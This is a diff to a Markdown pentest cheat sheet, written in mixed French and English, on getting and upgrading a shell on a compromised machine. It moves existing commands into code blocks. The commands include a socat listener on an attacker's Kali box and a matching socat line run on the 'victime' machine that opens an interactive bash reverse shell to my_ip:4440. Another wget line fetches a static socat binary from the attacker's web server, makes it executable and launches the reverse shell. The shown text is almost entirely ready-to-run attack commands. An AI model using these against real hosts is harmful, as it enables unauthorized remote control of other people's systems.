@@ -9,14 +9,28 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
 ## With socat
-`socat file:`tty`,raw,echo=0 tcp-listen:4440` on your kali
-`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440` from the victime machine
+On your kali
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:4440
+```
+From the victime machine
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440 
+```
 
 If socat is not installed see here for static binaries
-`wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440`
+```bash
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440
+```
 OR
-`wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat` in your kali then put on your python3 webserver
-and then **wget -q http://YOUR-KALI-IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR-KALI-IP:4440**
+```bash
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+```
+In your kali then put on your python3 webserver
+and then 
+```bash
+wget -q http://YOUR-KALI-IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR-KALI-IP:4440
+```
 
 ## Pour avoir un accès ssh
 
